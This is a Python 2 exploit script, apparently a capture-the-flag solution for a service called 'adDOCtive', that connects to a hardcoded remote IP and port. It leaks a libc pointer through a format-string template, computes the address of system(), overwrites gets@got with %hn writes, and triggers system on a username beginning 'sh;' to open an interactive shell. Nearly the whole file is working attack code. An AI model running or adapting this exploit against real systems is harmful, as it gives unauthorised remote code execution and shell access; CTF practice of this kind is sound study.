#!/usr/bin/env python

import sys
import socket
import struct
import telnetlib
import time
import re
import string
import random

banner = """
            ##################################################################
            ####                                                          ####
            #### adDOCtive - 'instantiate template' format string exploit ####
            ####                                                          ####
            ##################################################################
        """

print banner

s = socket.create_connection(("52.28.35.47", 1234))
#s = socket.create_connection(("127.0.0.1", 13337))


def interact():
    t = telnetlib.Telnet()
    t.sock = s
    t.interact()


def ra(to=.5):
    buf = ""
    s.setblocking(0)
    begin = time.time()
    while 1:
        if buf is not "" and time.time() - begin > to:
            break
        elif time.time() - begin > to*2:
            break
        try:
            data = s.recv(4096)
            if data:
                begin = time.time()
                buf += data
            else:
                time.sleep(.1)
        except:
            pass

    s.setblocking(1)
    return buf


def rt(delim):
    buf = ""
    while delim not in buf:
        buf += s.recv(1)
    return buf


def se(data):
    s.sendall(data)

def u32(d):
    return struct.unpack("<I", d)[0]

def u64(d):
    return struct.unpack("<Q",d)[0]


def p32(d):
    return struct.pack("<I", d)


def p64(d):
    return struct.pack("<Q", d)

def rstr(l):
    return ''.join(random.choice(string.ascii_letters + string.digits) for _ in range(l))

def register(user, passwd):
    se("1\n")
    se(user + "\n")
    se(passwd + "\n")

def login(user, passwd):
    se("2\n")
    se(user + "\n")
    se(passwd + "\n")

def create_template(name, content):
    se("4\n")
    se(name  + "\n")
    se(content + "\nEOF\n")

def instantiate_template(name, a, b, c):
    se("5\n")
    se(name + "\n")
    se(a + "\n")
    se(b + "\n")
    se(c + "\n")

def logout():
    se("0\n")



def pwn():
    # generate random username/password
    username = "sh;" + rstr(10)            # gonna need this sh string later
    password = rstr(10)


    stackoffset_libc_ret_main = 2111        # offset of return address of main() to libc on the stack
    offset_system = 0x2626d
    gets_got = 0x804c01c



    # register new user
    print "[+] register new user"
    register(username, password)

    # login
    print "[+] logging in"
    login(username, password)


    ########## First leak a libc pointer to calculate address of system() ###############
    print "[+] leaking libc pointer"

    # create template
    tmpl_name = rstr(10)
    create_template(tmpl_name, "''%" + str(stackoffset_libc_ret_main) + "$x' ")

    # instantiate template
    instantiate_template(tmpl_name, "a", "a", "a")

    # calculate addres of system() in the libc
    libc_ret_main = int(re.search("''([^']*)", ra()).group(1), 16)
    libc_system = libc_ret_main + offset_system

    print "[+] system @ " + hex(libc_system)


    ######### Now use format string to overwrite puts@got ##################
    #   we can overwrite gets@got with system() since gets() will 
    #   be called with our username as param.when we logout and login again
    print "[+] overwriting gets@got"


    # the lower/higher byte values for %n of system@libc
    lower_out = libc_system & 0xffff
    higher_out = (libc_system >> 16) - lower_out


    # create template
    tmpl_name = rstr(10)
    create_template(tmpl_name, 
            "%" + str(lower_out) + "c%6$hn" +               # overwrite the lower bytes of puts@got
            "%" + str(higher_out) + "c%7$hn")               # overwrite the higher bytes of puts@got


    # instantiate template
    instantiate_template(tmpl_name, p32(gets_got) + p32(gets_got+2) , "BBBB", "CCCC")


    # now logout and log back in to call gets(username)
    logout()
    login("","")

    ra()

    print "[+] Here's your shell: "
    interact()


pwn()

